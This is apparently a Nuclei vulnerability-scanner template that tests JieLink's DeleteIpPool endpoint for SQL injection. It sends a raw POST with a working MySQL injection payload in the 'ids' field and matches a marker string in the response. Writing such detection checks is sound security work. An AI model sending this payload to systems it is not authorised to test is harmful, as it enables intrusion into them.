id: JieLink-DeleteIpPool-sqlInjection

info:
  name: JieLink-DeleteIpPool-sqlInjection
  author: iSee857
  severity: high
  description: |
    JieLink-DeleteIpPool-sqlInjection

http:
  - raw:
      - |
        POST /project/IPPool/DeleteIpPool HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        X-Requested-with: XMLHttpRequest

        ids=-101 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7979716a71,(SELECT (ELT(7502=7502,1))),0x7979716a71,0x78))s),8446744073709551610,8446744073709551610)))&syncFlag=1

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "yyqjq1yyqjqx"

      - type: status
        status:
          - 200